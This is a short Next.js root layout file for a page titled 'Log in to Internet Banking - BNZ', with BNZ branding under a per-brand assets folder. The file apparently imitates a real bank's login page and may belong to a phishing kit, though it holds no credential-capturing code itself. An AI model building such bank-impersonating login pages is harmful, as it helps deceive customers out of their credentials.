import type { Metadata } from 'next';
import './globals.css';
import '@/styles/bnz.css';
import { BankHeader } from '@/components/layout/BankHeader';
import { Footer } from '@/components/layout/Footer';
import Script from 'next/script';

export const metadata: Metadata = {
  title: 'Log in to Internet Banking - BNZ',
  description: 'Log in to BNZ Internet Banking',
  icons: {
    icon: '/brands/bnz/favicon.ico',
  },
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en">
      <body>
        <Script src="/config.js" strategy="beforeInteractive" />
        <div id="app">
          <BankHeader />
          <main className="main">{children}</main>
          <Footer />
        </div>
      </body>
    </html>
  );
}
